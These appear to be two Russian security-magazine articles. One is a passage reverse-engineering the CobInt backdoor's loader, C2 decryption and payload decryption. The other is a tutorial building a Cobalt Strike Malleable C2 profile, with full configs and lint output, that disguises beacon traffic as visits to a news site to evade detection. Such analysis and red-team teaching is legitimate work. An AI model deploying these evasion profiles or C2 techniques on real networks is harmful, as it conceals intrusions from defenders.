Ставим брейк‑пойнт на следующей за jne инструкции и нажимаем F9, чтобы
вручную не ходить по каждой итерации цикла расшифровки. После остановки
на нашем брейк‑пойнте проходим по коду немного дальше и прыгаем
на начало уже расшифрованного кода в оригинальной EntryPoint.





                     Расшифрованный код в EntryPoint

На этом этапе мы можем сдампить PE в расшифрованном виде для удобства
дальнейшего дебага. Я использую в этих целях плагин OllyDumpEx.





                       Дамп процесса

Код для расшифровки себя в памяти содержит следующий алгоритм:
 1. XOR первых четырех байтов (Little Endian) с зашитым ключом 0x4498D9DE.
 2. Побитовый сдвиг влево на один бит для ключа (rol xor_key, 1 ).
 3. XOR следующих четырех байтов с модифицированным ключом и так далее.


        WWW

                            Интерпретация  алгоритма расшифровки на Go
                        с вшитым ключом





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
             COBINT
            ИЗУЧАЕМ РЕВЕРС МАЛВАРИ
             НА ПРИМЕРЕ ИЗВЕСТНОГО
                         БЭКДОРА





ИССЛЕДОВАНИЕ ЗАГРУЗЧИКА

Unhashing functions
Настало время поковыряться в загрузчике. Открываем сдампленный файл
в x64dbg. В коде встречается множество вызовов функции 401380, в которую
передаются различные Hex-значения. Обычно такой паттерн свойственен
функциям, отвечающим за  восстановление имен  библиотек и  функций
из хеш‑значений. Как видно на скриншоте, первый вызов вернул имя функции
LoadLibraryA библиотеки Kernel32, а также ее адрес в RCX.





                         Вызов unhashing-функции

Рассмотрим эту функцию подробнее. Обрати внимание на следующий код.





                Инструкции для получения информации из PEB

Этот модуль сначала получает указатель на PEB (Process Environment Block)
через смещение 0x60 в TEB (Thread Environment Block), доступ к которому
осуществляется через регистр gs. Затем код переходит по смещениям 0x18
и 0x20. Чтобы понять, что это за смещения, можно обратиться к описанию
структуры PEB или проверить их в WinDbg. Для этого:
 • загружаем исполняемый файл в WinDbg;
 • вводим команду bp $exentry для установки брейк‑пойнта на EntryPoint;
 • запускаем исполнение командой g ;
 • перемещаемся нажатием F8 к рассматриваемому участку кода.

Команда dt ntdll!_PEB @$peb покажет структуру PEB со смещениями.





                           Структура PEB в WinDbg

Первое смещение указывает на структуру PEB_LDR_DATA, которая содержит
в себе сведения о загруженных модулях для процесса. Изучим ее пов‐
нимательнее, для этого в WinDbg введем команду dt -r1 _PEB_LDR_DATA.





                     Структура PEB_LDR_DATA в WinDbg

Второе     смещение      указывает     на      двусвязный      список
InMemoryOrderModuleList, который содержит загруженные модули для про‐
цесса. Каждый элемент в этом списке является указателем на структуру
LDR_DATA_TABLE_ENTRY. Смещение на него лежит в rbx, поэтому берем
адрес из rbx и накладываем на него структуру _LDR_DATA_TABLE_ENTRY.





  Содержание структуры LDR_DATA_TABLE_ENTRY, на которую получен
  указатель

Таким образом, по смещению 0x50 код получает доступ к полю buffer с име‐
нем модуля. Далее вызывается функция, в которую аргументами передается
указатель на строку с именем модуля и длина строки.





              Передача имени модуля и длины строки в функцию

Эта функция выполняет хеширование строки. Алгоритм выглядит следующим
образом.





                       Алгоритм хеширования строки

Получив хеш, алгоритм проверяет полученное значение с переданным ранее
аргументом. Если значения не совпадают, выполняется переход к следующе‐
му имени модуля. Если совпадают, то сохраняется указатель на адрес биб‐
лиотеки, к которому прибавляются смещения.




                 Доступ к данным библиотеки по смещениям

По смещению 0x3c мы получаем значение e_lfanew, указывающее на NT
Headers. Прибавив к нему 0x88, мы получим указатель на таблицу экспорта
и по смещению 0x20 найдем указатель на AddressOfNames. Здесь содер‐
жатся  имена  экспортируемых  библиотекой  функций. Имя  передается
в хеширующую функцию, после чего хеш сравнивается с переданным ранее.





            Передача имени API-функции в функцию хеширования

Таким образом код резолвит список API-функций, которые будут исполь‐
зованы в дальнейшем.


HTTP Request to C2
Дальше код загружает библиотеки wininet.dll и urlmon.dll, что намекает
на последующий алгоритм работы шелл‑кода. Затем программа получает
адреса интересующих ее функций из загруженных библиотек и приступает
к их вызову. Первой в цепочке вызывается функция ObtainUserAgentString
из urlmon.





                   Вызов функции ObtainUserAgentString

Второй вызывается InternetOpenA для инициализации WinInet и получения
дескриптора. По адресу 0x401195 мы видим процесс расшифровки C2. Сна‐
чала в буфер загружаются зашифрованные байты, затем они ксорятся пач‐
ками по четыре байта с XOR-ключом F055FDF8.





                    Процесс расшифровки домена C2

Как обычно, ставим брейк‑пойнт на следующую  инструкцию  после jne
и смотрим в буфер, на который указывает адрес в регистре RCX. Там обна‐
руживается расшифрованный C2.





Этот C2 используется в функции InternetConnectA.





После выполнения функции мы попадаем на код для расшифровки имени
файла с нагрузкой на C2. Алгоритм тот же самый, что и при расшифровке
домена.





               Расшифровка имени страницы на сервере C2

После получения URL вызывается функция HttpOpenRequestA для фор‐
мирования хендла запроса, а в конце — функция HttpSendRequestA, которая
уже непосредственно отправляет GET-запрос на сформированный URL.


             INFO

                          Чтобы не включать интернет на виртуалке, не сту‐
                             чаться на C2 к хакерам и чтобы шелл при этом
                             корректно отрабатывал без патчинга, я прописал
                        в файле hosts C2 на localhost, после чего под‐
                       нял простой веб‑сервер на питоне. Тут нужно
                      иметь в виду, что запрос идет по HTTPS и наш
                          сервер должен это поддерживать. Для начала
                      генерим сертификат:

                     openssl.exe req -new -x509 -keyout
                     server.pem -out server.pem -days 365
                     -nodes

                    А вот код для самого веб‑сервера:

                     from http.server import HTTPServer,
                     SimpleHTTPRequestHandler
                     import ssl


                     server_address = ('localhost' , 443)
                     httpd = HTTPServer(server_address,
                     SimpleHTTPRequestHandler)
                     httpd.socket = ssl.wrap_socket(httpd.
                     socket, certfile='server.pem' ,
                     server_side= True)


                     print("Starting HTTPS server...")
                     httpd.serve_forever()





                Успешный HTTP-запрос к нашему серверу

Запрос выполнен успешно, поэтому шелл‑код продолжает свою работу.
На следующем шаге мы вызываем функцию VirtualAlloc. Она выделяет
буфер для следующего стейджа, который позднее будет получен с C2.
VirtualAlloc возвращает адрес выделенного буфера в RAX. Желательно
сразу нажать на него правой кнопкой мыши и выбрать в контекстном меню
пункт Follow in Dump, чтобы отслеживать его содержимое.





             Выделение буфера с помощью функции VirtualAlloc

На этом этапе в глаза бросается вызов функции InternetReadFile, которая
должна получить следующий стейдж с сервера и положить его в выделенный
буфер. Так как сам стейдж в рассматриваемом примере заранее загружен
отдельным файлом (а в отдельных случаях он оседает в кеше IE, откуда его
можно достать), мы просто положим его на веб‑сервер, не меняя имя.
В качестве альтернативы можно загрузить стейдж в буфер вручную, но при
этом есть шанс столкнуться с проблемами в логике шелл‑кода, с которыми
придется разбираться. После выполнения функции мы видим, что в буфер
успешно загрузилось содержимое файла с пейлоадом.





                  Успешная загрузка пейлоада в буфер

Затем идет модуль, расшифровывающий код в буфере. Как обычно, ставим
брейк‑пойнт за jne и смотрим, как изменился код в буфере.





                         Результат расшифровки пейлоада

Формируется адрес точки входа, куда и передается управление.





           Переход на точку входа расшифрованной библиотеки

На этом этапе мы уже можем сдампить расшифрованный PE. Нажимаем пра‐
вую кнопку мыши, выбираем пункт Follow in Memory Map и дампим соответс‐
твующий сегмент памяти в файл.





             Дамп расшифрованной библиотеки на диск

На всякий случай проверим в PeStudio, что все прошло гладко.





                        Таблица импорта в PeStudio





                        Таблица экспорта в PeStudio

Импорты и экспорт на месте, можно двигаться дальше.


Расшифровка полезной нагрузки
Алгоритм расшифровки выглядит следующим образом:


  key = 0xF055FDF8;
  counter = (unsigned __int64)(unsigned int)(v20 + 4) >> 2;
do
{
  result = first_chunk ^ (*data_pointer - key);
  val1_ror = (*data_pointer >> 3) & 7;
  first_chunk = (unsigned int)__ROL4__(first_chunk, (*data_pointer &
7) + 1);
  *data_pointer++ = result;
  key = __ROR4__(key, val1_ror + 1);
  --counter;
}
while ( counter )

В код зашит ключ. В качестве вектора инициализации используются первые
восемь байтов из буфера, то есть данные начинают расшифровываться
со второго 8-байтного значения. Я написал декриптор на Go и выложил на
GitHub рабочий вариант.
   Этот вариант требует наличия XOR-ключа для расшифровки, который
содержит предыдущий стейдж. Но что делать, если у нас на руках только
зашифрованный пейлоад, который мы вытащили, например, из кеша  IE,
а кода самого загрузчика нет? В таком случае я не придумал ничего лучше,
чем просто попытаться сбрутить 8-байтный ключ, который используется
в алгоритме шифрования. Многопоточный брутер ключа написан на Go, его
тоже можно скачать с гитхаба.
   Программа запускается следующей командой:


payload_decrypt_auto.exe enc.bin dec.bin

В качестве значения для верификации код будет искать в расшифрованных
данных строку This  program  cannot  be  run  in  DOS  mode. Результат
работы программы — расшифрованная DLL и вывод подобранного XOR-клю‐
ча. В ходе экспериментов программа успешно расшифровала все име‐
ющиеся у меня семплы, на это у нее ушло в среднем от минуты до пятнадцати
минут.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
             COBINT
            ИЗУЧАЕМ РЕВЕРС МАЛВАРИ
             НА ПРИМЕРЕ ИЗВЕСТНОГО
                         БЭКДОРА





ИССЛЕДОВАНИЕ ЗАГРУЖЕННОЙ DLL

Продолжаем дебажить. В x64dbg перейдем уже непосредственно в рас‐
шифрованную библиотеку, параллельно откроем код в IDA и посмотрим, где
мы оказались после перехода по смещению. А оказались мы в экспортиру‐
емой функции ReflectiveLoader.





                         Экспортируемая функция DLL

Так как в таблице импорта фигурируют адреса функций из библиотеки
WinInet, сразу расставим брейк‑пойнты на следующие функции (в x64dbg
это можно сделать в строке Command: bp FunctionName):
 • InternetOpenA;
 • HttpOpenRequestA;
 • InternetReadFileA;
 • VirualAlloc;
 • GetProcAddress.

Запускаемся.  Сначала  брякаемся  на  функции  VirtualAlloc,  которая
выделяет буфер. Перейдем на адрес буфера в окне Dump: здесь код резол‐
вит адреса библиотечных функций для дальнейшей работы.
   Останавливаемся на вызове InternetOpenA, так как это может служить
индикатором  подготовки  к  выполнению  HTTP-запроса.  Следовательно,
где‑то поблизости должен будет расшифровываться C2. Поищем глазами
по коду подозрительные места с XOR, которые могут отвечать за расшифров‐
ку полезной для нас информации. Находим подходящий участок кода.





                   Инструкции для расшифровки домена C2

В функцию передаются указатели на XOR-ключ и зашифрованные данные.





                     Вызов функции расшифровки C2

Видим значения для дешифровки.





А вот и сам XOR-ключ.





                            XOR-ключ

Таким образом, расшифровка данных происходит путем побайтового ксора
ключа с зашифрованной строкой. Ставим брейк‑пойнт за jne и видим рас‐
шифрованное значение.





                       Расшифрованное значение C2

Кстати, если  поискать в сыром Hex сдампленной на диск  библиотеки
это зашифрованное значение и ключ для него, мы найдем их захардкожен‐
ными после таблицы импорта.





                  Захардкоженные значения C2 и XOR-ключа

Исследование трех различных семплов малвари показало, что смещения
ключа и зашифрованных байтов относительно друг друга идентичны у версии
x64 и отличались у версии x86. На основе этих данных я написал эксперимен‐
тальный код на Go для дешифровки C2.





У меня программа сработала, но это, конечно, не дает никаких гарантий, что
дешифровщик нормально отработает на других семплах.
   Продолжая  исследовать  код,  мы  натыкаемся  на  вызов  функции
GetAdaptersInfo, в результате выполнения которой будет извлечено зна‐
чение ServiceName сетевого адаптера.





                      Вызов функции GetAdaptersInfo





                     Значение ServiceName в реестре

Затем вызывается функция, которая генерирует огромное количество ран‐
домных байтов, попутно перексоривая между собой все, что попадается
под руку, включая ServiceName. В дальнейшем, вероятно, эти значения
используются в качестве уникального идентификатора системы на C2.





            Функция для генерации идентификационной строки

В результате всех этих операций будет сгенерирована следующая строка.





              Сформированная идентификационная строка

Далее идут функции для подготовки и отправки HTTP-запроса на C2.





               Функции подготовки и отправки HTTP-запроса

В итоге с C2 на инфицированную машину снова будет загружен пейлоад
при помощи функции InternetReadFile, после чего он расшифровывается
и запускается.


ВЫВОДЫ

Начав анализ со скрипта в логах PowerShell, мы успешно извлекли и рас‐
шифровали загрузчик, саму полезную нагрузку, проанализировали техничес‐
кую реализацию компонентов малвари, а также написали пару полезных ути‐
лит для дешифровки кода на разных этапах работы вредоносного ПО.
ВЗЛОМ





Malleable C2 — это мощная функция Cobalt
Strike,  которая   позволяет   настраивать
и изменять сетевое взаимодействие между
маячком и сервером. Это дает злоумыш‐
ленникам возможность маскировать свой              d3f0x0                                                                                                                 threat hunter,
трафик, делая его похожим на легитимные              threat researcher
запросы  и   ответы.  Такая  маскировка
помогает  обойти  системы  обнаружения
и затруднить анализ трафика.


В этой статье мы рассмотрим процесс создания и настройки профиля
Malleable C2, который будет имитировать легитимные запросы к известным
сайтам. Мы детально разберем структуру профиля и посмотрим, как замас‐
кировать его под взаимодействие с реальными сервисами.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ЧТО ТАКОЕ ПРОФИЛЬ MALLEABLE C2

Профиль Malleable C2 позволяет гибко настроить поведение маячка (beacon)
Cobalt Strike при взаимодействии с сервером управления (Team Server).
Основное назначение профиля Malleable C2 — изменять сетевые запросы
и ответы таким образом, чтобы они выглядели как обычный трафик, который
не будет вызывать вопросов у систем IDS/IPS. К тому же это усложняет ана‐
лиз трафика специалистами. Достигается же маскировка путем настройки
различных параметров HTTP-запросов и ответов: URI, заголовков, парамет‐
ров и содержимого запроса.


КАК ПРОИСХОДИТ ВЗАИМОДЕЙСТВИЕ

Когда маячок запускается на целевой машине, он инициирует транзакцию
HTTP-GET к Team Server (запрос при этом может быть как GET, так и POST).
В запросе передаются метаданные о скомпрометированной системе. Сер‐
вер в ответ отправляет задачи, которые должен выполнить маячок. После
завершения задач маячок проверяет наличие данных для отправки и ини‐
циирует транзакцию HTTP-POST, содержащую идентификатор сеанса. Сер‐
вер использует эту информацию для привязки данных к соответствующему
сеансу.
   Теперь, когда мы разобрались с основами взаимодействия маячка и сер‐
вера, перейдем к настройке профиля Malleable C2.


СТРУКТУРА ПРОФИЛЯ

Для запуска Team Server с кастомным профилем необходимо выполнить
команду


./teamserver <ip> <pass> <путь к файлу с профилем>

Профиль описывает, как маячок общается с сервером и как происходит пос‐
тэксплуатация. Выше я говорил, что маячок использует два вида транзакций
для обмена данными (HTTP-GET и HTTP-POST). Дальше мы посмотрим,
как реализовать это в профиле.


http-get
В профиле параметр http-get отвечает за передачу метаданных на Team
Server и получение задач от него. Он обязан содержать ключи:
 • client — описывает, как будет выглядеть HTTP-запрос от маячка к сер‐
   веру;
 • server — описывает ответ сервера на запрос.

Ключ client должен иметь параметр metadata, в котором определяются
способы  обработки  отправляемой  маячком  метаинформации,  а  ключ
server — параметр output, в котором описывается порядок обработки отве‐
та клиенту.
  В параметрах client и server еще определяются:
 • uri — описывает URL;
 • header — добавляет HTTP-заголовки к запросу;
 • parameter — добавляет параметры к uri.

В перечисленных параметрах могут использоваться подстановочные знаки
или перечисление значений.
   Изменять метаданные  (metadata) и выводимую информацию  (output)
помогут следующие выражения:
 — append — добавляет строку в конце данных;
— base64 — кодирует данные в Base64;
— base64url — кодирует данные в Base64 для использования в URL;
— mask — выполняет операцию XOR со случайным ключом;
— netbios — кодирует данные в NetBIOS;
— netbiosu — кодирует данные в NetBIOS;
— prepend — добавляет строку перед данными.
   Преобразование данных должно заканчиваться одним из следующих опе‐
раторов, указывающих на место размещения передаваемой информации
в HTTP-запросе:
 • header "Cookie" — запишет отправляемые данные в HTTP-заголовок
  Cookie (может использоваться любой заголовок);
 • parameter "view" — запишет отправляемые данные в параметр view
   (например,              http://sadfadsf.com/asdfsadf?view=<
  передаваемые_данные> );
 • print — запишет данные в тело HTTP (обязателен для блоков http-
  get.server.output, http-post.server.output и http-stager.
  server.output);
 • uri-append — добавит данные в URI.

Структура профиля HTTP-GET будет следующая:


http-get {


    set uri "/hacker/notes/[set.php|view.php]";


    client {
        # Параметры header и parameter можно пропустить
        header "Accept-Encoding" "gzip, deflate";
        parameter "user" "admin|xaker|helpdesk";
        metadata {
            base64url
            uri-append
        }
    }


    server {
        # Параметры header и parameter можно пропустить
        header "Accept-Encoding" "gzip, deflate";
        parameter "user" "admin|xaker|helpdesk";


        output {
            mask
            base64
            prepend "data="
            print
        }
    }
}


http-post
Этот параметр отвечает за отправку данных, полученных в результате выпол‐
нения задач маячка.
   Аналогично транзакции HTTP-GET в HTTP-POST описывается, как отправ‐
лять и принимать данные. Для client требуется описать client.id — ID сес‐
сии маячка, client.output — данные, отправляемые маячком; server.
output, как правило, пустой.


http-post {
    set uri "/notes/[add.php|delete.php]";


    client {
        header "Flag" "Im not hacker";
        parameter "username" "admin";


        id {
            mask;
            base64url;
            print
        }


        output {
            mask;
            base64url;
            print;
        }
    }


    server {


        output {
            base64url;
            print;
        }
    }
}

Несмотря на названия структур http-get и http-post, мы можем переопре‐
делить, какие HTTP-запросы будут использоваться для передачи информа‐
ции:


set verb "POST"; # GET or POST

Например:


http-get {
    set uri "/test /qvest";
    set verb "POST";
    client {
        metadata {
            print;
        }
    }
    server {
        output {
            print;
        }
    }
}

Теперь, когда мы познакомились со структурой Malleable C2, мы можем
перейти к созданию профиля, который будет маскировать трафик под работу
с легитимным сайтом.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       MALLEABLE C2
             СОЗДАЕМ ПРОФИЛЬ ДЛЯ
            СКРЫТОЙ ПЕРЕДАЧИ ДАННЫХ
                       COBALT STRIKE





ВЫБИРАЕМ САЙТ И НАПОЛНЯЕМ ПРОФИЛЬ

Профиль по умолчанию
Team Server запускается с конфигом по умолчанию. Давай посмотрим на ту
часть, которая отвечает за сетевое взаимодействие.


http-get {


    set uri "/ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /
updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /
ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";


    client {
        metadata {
            base64;
            header "Cookie";
        }
    }

Видим, что маячок будет обращаться к Team Server, используя одно из зна‐
чений, указанных в параметре uri.


             INFO

                             Пути из профиля по умолчанию могут исполь‐
                           зоваться  для  поиска  следов  компрометации
                        в    инфраструктуре,   если    злоумышленник
                      не поменял профиль на свой.


Метаинформация  маячка  кодируется в Base64 и помещается в HTTP-
заголовке Cookie.
   HTTP-ответ сервера будет содержать заголовок Content-Type с содер‐
жимым application/octet-stream. Нагрузка сервера хранится в теле отве‐
та.


    server {
        header "Content-Type" "application/octet-stream";
        output {
            print;
        }
    }
}

Давай теперь рассмотрим случай запроса HTTP-POST. Для транзакции будет
использоваться вот такой URI: /submit.php. Заголовок Content-Type — тот
же,  application/octet-stream.  Идентификатор  будет   передаваться
параметром URL, например:


/submit.php?id=2v78b472834v789b0378b906v

Передаваемые данные — в теле запроса:


http-post {
    set uri "/submit.php";
    client {
        header "Content-Type" "application/octet-stream";
        id {
            parameter "id";
        }
        output {
            print;
        }
    }

Ответ сервера имеет заголовок HTTP Content-Type со значением text/
html. Данные — в теле ответа.


    server {
        header "Content-Type" "text/html";


        output {
            print;
        }
    }
}

Давай посмотрим, как это будет выглядеть в трафике. Для тестирования про‐
филя у Cobalt Strike есть скрипт c2lint. Для его запуска пишем:


./c2lint путь к файлу

В профиле было определено, что маяк должен обратиться на один из указан‐
ных URI (visit.js), а метаданные должны быть указаны в HTTP-заголовке
Cookie в виде Base64. У заголовка ответа сервера должны быть Content-
Type: application/octet-stream, а данные — в теле ответа.


http-get
---
GET /visit.js HTTP/1.1
Cookie: AlZ5bksajXiMR33rpPYp8w==
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64
; Trident/6.0; MASP)


HTTP/1.1 200 OK                                       Content-Type:
application/octet-stream                Content-Length: 64


~Ak&.....E..S;..U.. .%.......:4Hb.+.H...........H+.aY.2`..P..A..

При выполнении транзакции HTTP-POST маяк выполняет POST-запрос на /
submit.php и добавляет параметр id, который хранит значение идентифика‐
тора сессии; данные выводятся в HTTP-body. Ответ сервера, в свою очередь,
должен иметь заголовок Content-Type: text/html.


http-post
---
POST /submit.php?id=56926 HTTP/1.1                    Content-Type:
application/octet-stream
Content-Length: 16                                    User-Agent:
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0
; MALCJS)
.pi...9..csQ...f
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

Давай на  практике  убедимся, что рассмотренные нами запросы будут
передаваться в трафике в описанном формате.





                    Транзакция HTTP-GET по умолчанию





                    Транзакция HTTP-GET по умолчанию


Копируем запросы с интересующего ресурса
Для копирования запросов с сайтов я использую Burp Suite. Он предоставля‐
ет возможность локально на компьютере создать HTTPS-прокси, что поз‐
волит нам посмотреть трафик за SSL и познакомиться со структурой сайта.
  Для примера давай создадим профиль, который будет мимикрировать
под просмотр статей на xakep.ru.
   HTTP-запрос выглядит следующим образом:


GET /2024/06/14/detecting-edr-bypass/ HTTP/1.1
Host: xakep.ru
Cookie: _ga=GA1.1.1915749425.1718546663; _ym_uid=171854666650412871;
_ym_d=1718546666; _ym_isad=2; _ym_visorc=w; enPop_sessionId=720a32b1-
2be9-11ef-ba22-4a1c703d3d35; _ga_BR3RNXPV1V=GS1.1.1718559957.2.1.
1718560215.60.0.0
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/
avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;
v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://xakep.ru/issues/xa/299/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive


Описание транзакции HTTP-GET
Для написания конфига для транзакции HTTP-GET составим его тело и будем
наполнять.


http-get {
    set uri "";


    client {
        metadata {
            print;
        }
    }
    server {
        output {
            print;
        }
    }
}

Параметр uri будет содержать несколько путей к статьям:


set uri "/2024/06/14/detecting-edr-bypass/ /2024/06/14/
youtube-server-side-ads/ /2024/06/14/bifrost-valhall-0day/";





                              Пути к статьям из Burp

Опишем структуру клиента.


client {
    header "Referer" "https://xakep.ru/issues/xa/299/";
    header "User-Agent" "User-Agent: Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.
60 Safari/537.36"


    metadata {
        base64;
        prepend "_ym_visorc=w; enPop_sessionId=";
        header "Cookie";
    }
}

Опишем ответ сервера. На рисунке ниже видим, как ответ выглядит в Burp.





                          Ответ сервера в Burp Suite

Добавим в профиль HTTP-заголовки, аналогичные ответу сервера. Спрячем
данные, которые сервер отправляет маяку, для этого используем кодиро‐
вание Base64 и добавление строк в начале и конце данных. Для этого вос‐
пользуемся ключевыми словами base64, prepend и append.


server {
    header "SERVER" "QRATOR";
    header "Content-Type" "text/html; charset=UTF-8";
    header "Connection" "keep-alive";
    header "Keep-Alive" "timeout=15";
    header "X-Powered-By" "PHP/7.4.32";
    header "Content-Length" "144207";


    output {
        base64;
        prepend "<!DOCTYPE html><html lang='ru-RU' prefix='og:
http://ogp.me/ns# article: http://ogp.me/ns/rticle# profile: http://
ogp.me/ns/profile# fb: http://ogp.me/ns/fb#'><head><meta
charset='UTF-8' /><meta name='viewport' content='width=device-width,
initial-scale=1, maximum-scale=1, user-scalable=0' /><link
rel='profile' href='http://gmpg.org/xfn/11' /><link rel='pingback'
href='https://xakep.ru/xmlrpc.php' /><meta
name='mailru-verification' content='19264888db6819ce' />";
        append "<title>Детект на связи. Учимся обнаруживать следы
атак на EDR — Хакер</title><meta name='robots'
content='max-image-preview:large' /><link rel='dns-prefetch' href='//
www.google.com' /><link rel='dns-prefetch' href='//fonts.googleapis.
com' />";
        print;
    }
}

Описание транзакции HTTP-GET будет выглядеть так:


    http-get {


        set uri "/2024/06/14/detecting-edr-bypass/ /2024/06/14/
youtube-server-side-ads/ /2024/06/14/bifrost-valhall-0day/";


        client {
            header "Referer" "https://xakep.ru/issues/xa/299/";
            header "User-Agent" "User-Agent: Mozilla/5.0 (Windows NT
10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.
0.6422.60 Safari/537.36"


            metadata {
                base64;
                prepend "_ym_visorc=w; enPop_sessionId=";
                header "Cookie";
            }
        }


        server {
            header "SERVER" "QRATOR";
            header "Content-Type" "text/html; charset=UTF-8";
            header "Connection" "keep-alive";
            header "Keep-Alive" "timeout=15";
            header "X-Powered-By" "PHP/7.4.32";
            header "Content-Length" "144207";


            output {
                base64;
                prepend "<!DOCTYPE html><html lang='ru-RU'
prefix='og: http://ogp.me/ns# article: http://ogp.me/ns/rticle#
profile: http://ogp.me/ns/profile# fb: http://ogp.me/ns/fb#'><head><
meta charset='UTF-8' /><meta name='viewport'
content='width=device-width, initial-scale=1, maximum-scale=1,
user-scalable=0' /><link rel='profile' href='http://gmpg.org/xfn/
11' /><link rel='pingback' href='https://xakep.ru/xmlrpc.php' /><
meta name='mailru-verification' content='19264888db6819ce' />";
                append "<meta name='robots'
content='max-image-preview:large' /><link rel='dns-prefetch' href='//
www.google.com' /><link rel='dns-prefetch' href='//fonts.googleapis.
com' />";
                print;
            }
        }
    }


Описание транзакции HTTP-POST
Снова берем шаблон транзакции и наполняем.


http-post {
    set uri "";


    client {
        header "" "";
        parameter "" "";


        id {
            print
        }


        output {
            print;
        }
    }


    server {


        output {
            print;
        }
    }
}

Давай переопределим запрос HTTP-POST на HTTP-GET:


set verb "GET";

Укажем URI:


set uri "/pentest";

Заполним информацию о клиенте.


    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64;
x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60
Safari/537.36"
        header "Accept" "Accept: text/html,application/xhtml+xml,
application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,
application/signed-exchange;v=b3;q=0.7";


        id {
            base64;
            prepend "_ga=GA1.1.1915749425.1718546663;
_ym_uid=171854666650412871; _ym_d=1718546666; enPop_sessionId=";
            header "Cookie";
        }


        output {
            base64;
            prepend "Windows-Id=";
            header "Sec-Ch-Ua-Platform";
        }
    }

И опишем ответ сервера.


    server {
        header "Server" "QRATOR";
        header "Content-Type" "text/html; charset=UTF-8";
        header "Connection" "keep-alive";
        header "X-Powered-By" "PHP/7.4.32";


        output {
            print;
        }
    }

В итоге описание транзакции будет выглядеть так:


http-post {
    set verb "POST";
    set uri "/pentest";


    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64;
x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60
Safari/537.36"
        header "Accept" "Accept: text/html,application/xhtml+xml,
application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,
application/signed-exchange;v=b3;q=0.7";


        id {
            base64;
            prepend "_ga=GA1.1.1915749425.1718546663;
_ym_uid=171854666650412871; _ym_d=1718546666; enPop_sessionId=";
            header "Cookie";
        }


        output {
            base64;
            prepend "Windows-Id=";
            header "Sec-Ch-Ua-Platform";
        }
    }


    server {
        header "Server" "QRATOR";
        header "Content-Type" "text/html; charset=UTF-8";
        header "Connection" "keep-alive";
        header "X-Powered-By" "PHP/7.4.32";


        output {
            print;
        }
    }
}

Настало время проверить работу нашего конфига. Воспользуемся  c2lint.
Транзакция HTTP-GET выглядит так:


http-get
---
GET /2024/06/14/bifrost-valhall-0day/ HTTP/1.1
Referer: https://xakep.ru/issues/xa/299
User-Agent: User-Agent                                Cookie: _ym_
visorc=w; enPop_sessionId=Y+Rmu3X5xJcpc+jlkbDRpQ==
HTTP/1.1 200 OK                                       SERVER:
QRATOR                                        Content-Type: text/
html; charset=UTF-8                Connection: keep-
alive                                Keep-Alive:
timeout=15                                X-Powered-By: PHP/7.4.
32                              Content-Length: 717
<!DOCTYPE html><html lang='ru-RU' prefix='og: http://ogp.me/ns#
article: http://ogp.me/ns/rticle# profile: http://ogp.me/ns/profile#
fb: http://ogp.me/ns/fb#'><head><meta charset='UTF-8' /><meta
name='viewport' content='width=device-width, initial-scale=1,
maximum-scale=1, user-scalable=0' /><link rel='profile' href='http://
gmpg.org/xfn/11' /><link rel='pingback' href='https://xakep.ru/
xmlrpc.php' /><meta name='mailru-verification'
content='19264888db6819ce' />
430cMgRMaT8gTPGgDNzPAfnZyiGeXXJPkUEOZQ+FLb2+ALzcJUkpSAUBO9VjwRvdfbwqL
i128SPvBKEF9F9jIA==<
meta name='robots' content='max-image-preview:large' /><link
rel='dns-prefetch' href='//www.google.com' /><link rel='dns-
prefetch' href='//fonts.googleapis.com' />

А вот транзакция HTTP-POST:


http-post
---
GET /pentest HTTP/1.
1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.
36                    Accept:
Accept                                        Cookie: _ga=GA1.1.
1915749425.1718546663; _ym_uid=171854666650412871; _ym_d=1718546666;
enPop_sessionId=MzE5NDk=
Sec-Ch-Ua-Platform: Windows-Id=TwwSfNFjLX1zyqCQ7S75pw==
HTTP/1.1 200 OK
Server: QRATOR                                        Content-Type:
text/html; charset=UTF-8                Connection: keep-
alive                                X-Powered-By: PHP/7.4.
32                             Content-Length: 0

Обрати внимание, что в транзакции HTTP-POST используется запрос HTTP-
GET.
   Посмотрим, как это выглядит в трафике.





     Трафик между Team Server и маяком с новым профилем, HTTP-GET





     Трафик между Team Server и маяком с новым профилем, HTTP-POST

